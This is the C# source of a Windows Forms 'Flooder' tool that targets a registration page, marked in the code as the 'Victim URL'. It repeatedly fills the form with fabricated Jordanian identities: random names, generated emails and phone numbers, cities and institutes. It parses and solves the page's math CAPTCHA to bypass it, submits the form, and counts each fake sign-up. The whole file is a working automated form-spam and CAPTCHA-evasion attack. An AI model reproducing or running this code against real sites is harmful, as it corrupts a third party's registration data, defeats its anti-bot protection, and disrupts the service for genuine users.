using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Globalization;

namespace Flooder
{
    public partial class FormMain : Form
    {
        public FormMain()
        {
            InitializeComponent();
        }


        //Victim URL
        string RegURL = @"http://www.jordantophacker.com/registration";
        private void buttonStart_Click(object sender, EventArgs e)
        {
           
            timerNext.Enabled = false;
            pageloaded = false;
            loop = 0;

            webBrowser.Navigate(RegURL);
            buttonStart.Text = "Refresh ...";

        }




        int GetRandomMonthIndex()
        {
            return new Random(DateTime.Now.Millisecond).Next(1, 13);
        }

        string GetRandomDayofMonth(int month)
        {

            return new Random(DateTime.Now.Millisecond).Next(1, DateTime.DaysInMonth(DateTime.Now.Year, month)).ToString();
        }

        string GetRandomYear()
        {
            return new Random(DateTime.Now.Millisecond).Next(1975, 1998).ToString();
        }

        string GetRandomGender()
        {
            int dummy = new Random(DateTime.Now.Millisecond).Next(1, 3);

            return dummy == 1 ? "Male" : "Female";


        }

        string GetRandomPhoneNumber()
        {
            int dummy = new Random(DateTime.Now.Millisecond).Next(1, 4);
            string ret = "";

            switch (dummy)
            {
                case 1:
                    ret = ("0795" + new Random(DateTime.Now.Millisecond).Next(100000, 900000).ToString());
                    break;

                case 2:

                    ret = ("078" + new Random(DateTime.Now.Millisecond).Next(1000000, 9000000).ToString());
                    break;

                case 3:

                    ret = ("077" + new Random(DateTime.Now.Millisecond).Next(1000000, 9000000).ToString());
                    break;

            }

            return ret;

        }

        string GetRandomEmail()
        {
            string domain = GetRandomDomain();

            return namer.NextName + "@" + domain;
        }


        string GetRandomDomain()
        {
            return Domains[new Random(DateTime.Now.Millisecond).Next(0, Domains.Count)];
        }


        string GetRandomName(string Gender)
        {
            if (Gender == "Male")
            {
                return MaleNames[new Random(DateTime.Now.Millisecond).Next(0, MaleNames.Count)];
            }
            else
            {
                return FemaleNames[new Random(DateTime.Now.Millisecond).Next(0, FemaleNames.Count)];
            }
        }


        string GetRandomTshirt()
        {
            return Tshirt[new Random(DateTime.Now.Millisecond).Next(0, Tshirt.Count)];
        }


        string SolveMathCaptcha(string doc)
        {

     
            string tag = "<input class=\"form-control form-text required\"";

            int tagindex = doc.IndexOf(tag);

            int mathIndex = tagindex;

            while (doc[mathIndex] != '>')
            {
                mathIndex--;
            }


            string Math = doc.Substring(mathIndex + 2, tagindex - mathIndex - 3);

            Math = Math.Replace("=", "");


            ExpressionEvaluator exp = new ExpressionEvaluator();

            string res = exp.Evaluate(Math).ToString();

            return res;

        }


        string GetRandomCity()
        {
            return Cities[new Random(DateTime.Now.Millisecond).Next(0, Cities.Count)];
        }


        string GetRandomBackground()
        {
            return Background[new Random(DateTime.Now.Millisecond).Next(0, Background.Count)];
        }

        string GetRandominstitute()
        {
            return Institute[new Random(DateTime.Now.Millisecond).Next(0, Institute.Count)];
        }



        int loop = 0;
        bool submitted = false;
        int fakes = 0;

        private void webBrowser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {


            pageloaded = true;
            timer_Refresh.Enabled = false;

            if (e.Url.Host != "www.jordantophacker.com")
            {
                return;
            }

            loop++;
            if (loop == 2)
            {

                fakes++;

                labelCount.Text = fakes.ToString();

                submitted = true;
                timerNext.Enabled = true;
                return;
            }


            HtmlElement form = webBrowser.Document.GetElementById("webform-client-form-1");

            if (form != null)
            {

                string Gender = GetRandomGender();
                string FirstName = "";
                string LastName = "";

                FirstName = GetRandomName(Gender);
                System.Threading.Thread.Sleep(50);
                LastName = GetRandomName("Male");


                //First name
                HtmlElement elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-first-name");
                elm.SetAttribute("value", FirstName);



                //Last name
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-last-name");
                elm.SetAttribute("value", LastName);


                //Month
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-birthday-month");
                int month = GetRandomMonthIndex();
                elm.SetAttribute("value", month.ToString());


                //Day
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-birthday-day");
                elm.SetAttribute("value", GetRandomDayofMonth(month));


                //year
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-birthday-year");
                elm.SetAttribute("value", GetRandomYear());


                //Nationality
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-nationality");
                elm.SetAttribute("value", "JO");


                //Gender

                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-gender");
                elm.SetAttribute("value", Gender);


                //Phone
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-phone-number");
                elm.SetAttribute("value", GetRandomPhoneNumber());


                //Email
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-email");
                elm.SetAttribute("value", GetRandomEmail());


                //T-shirt
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-t-shirt-size");
                elm.SetAttribute("value", GetRandomTshirt());


                //Address
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-address");
                elm.SetAttribute("value", "Jordan");


                //City
                elm = webBrowser.Document.GetElementById("edit-submitted-personal-info-city");
                elm.SetAttribute("value", GetRandomCity());

                //background
                elm = webBrowser.Document.GetElementById("edit-submitted-technical-background-background");
                elm.SetAttribute("value", GetRandomBackground());


                //ins
                elm = webBrowser.Document.GetElementById("edit-submitted-technical-background-institute-name");
                elm.SetAttribute("value", GetRandominstitute());


                //ins
                elm = webBrowser.Document.GetElementById("edit-submitted-accept-1");
                elm.InvokeMember("CLICK");


                //Math
                elm = webBrowser.Document.GetElementById("edit-captcha-response");
                elm.SetAttribute("value", SolveMathCaptcha(webBrowser.DocumentText));


                Application.DoEvents();

                
                form.InvokeMember("submit");

            }

        }


        List<string> Emails = new List<string>();
        List<string> MaleNames = new List<string>();
        List<string> FemaleNames = new List<string>();
        List<string> Tshirt = new List<string>();
        List<string> Cities = new List<string>();
        List<string> Background = new List<string>();
        List<string> Institute = new List<string>();
        List<string> Domains = new List<string>();

        MarkovNameGenerator namer;

        private void FormMain_Load(object sender, EventArgs e)
        {

            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\Emails.txt"))
            {
                while (!fs.EndOfStream)
                {

                    string ret = fs.ReadLine().Trim();
                    Emails.Add(ret);

                }
            }

            namer = new MarkovNameGenerator(Emails, 2, 7);


            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\dict_arabicnames_female.txt"))
            {
                while (!fs.EndOfStream)
                {

                    string ret = fs.ReadLine().Trim();
                    FemaleNames.Add(ret);

                }
            }

            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\dict_arabicnames_male.txt"))
            {
                while (!fs.EndOfStream)
                {

                    string ret = fs.ReadLine().Trim();
                    MaleNames.Add(ret);

                }
            }

            using (System.IO.StreamReader fs = new System.IO.StreamReader(Application.StartupPath + @"\Domains.txt"))
            {
                while (!fs.EndOfStream)
                {

                    string ret = fs.ReadLine().Trim();
                    Domains.Add(ret);

                }
            }



            Tshirt.Add("XL");
            Tshirt.Add("L");
            Tshirt.Add("M");
            Tshirt.Add("S");


            Cities.Add("Amman");
            Cities.Add("Zarqa");
            Cities.Add("Irbid");
            Cities.Add("Mafraq");
            Cities.Add("Jerash");
            Cities.Add("Aqaba");
            Cities.Add("Madaba");
            Cities.Add("Salt");
            Cities.Add("Russeifa");
            Cities.Add("Wadi as-ser");
            Cities.Add("Tila al ali");
            Cities.Add("Ar ramtha");
            Cities.Add("sahab");
            Cities.Add("karak");
            Cities.Add("ajloun");




            Background.Add("School Student");
            Background.Add("University Student");
            Background.Add("Professional");


            Institute.Add("Jordan university");
            Institute.Add("Jerash university");
            Institute.Add("Yarmouk");
            Institute.Add("Oxford schools");
            Institute.Add("kings academy");
            Institute.Add("PSUT");
            Institute.Add("none");
            Institute.Add("freelancer");
            Institute.Add("internet");
            Institute.Add("facebook");
            Institute.Add("balqa univirsirt");
            Institute.Add("heashmite university");
            Institute.Add("al al-bayt");
            Institute.Add("google");
            Institute.Add("no institute");
            Institute.Add("Ajloun National University");
            Institute.Add("Al-Ahliyya Amman University");
            Institute.Add("Al-Isra University");
            Institute.Add("Al-Zaytoonah University of Jordan");
            Institute.Add("Amman Arab University");
            Institute.Add("Applied Science Private University");
            Institute.Add("Arab Open University");
            Institute.Add("German-Jordanian University");
            Institute.Add("Middle East University");
            Institute.Add("Philadelphia University");
            Institute.Add("Petra University");
            Institute.Add("Princess Sumaya University for Technology");
            Institute.Add("Jerash Private University");
            Institute.Add("Mutah University");
            Institute.Add("Tafila Technical University");
            Institute.Add("Zarqa Private University");

        }


        bool pageloaded = false;
        private void timer1_Tick(object sender, EventArgs e)
        {
            timerNext.Enabled = false;
            pageloaded = false;

            submitted = false;
            loop = 0;

            webBrowser.Navigate(RegURL);
            timer_Refresh.Enabled = true;

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Console.WriteLine(GetRandomEmail());
        }

    

        private void timer_Refresh_Tick(object sender, EventArgs e)
        {
            timer_Refresh.Enabled = false;
            buttonStart.PerformClick();
        }

    }
}
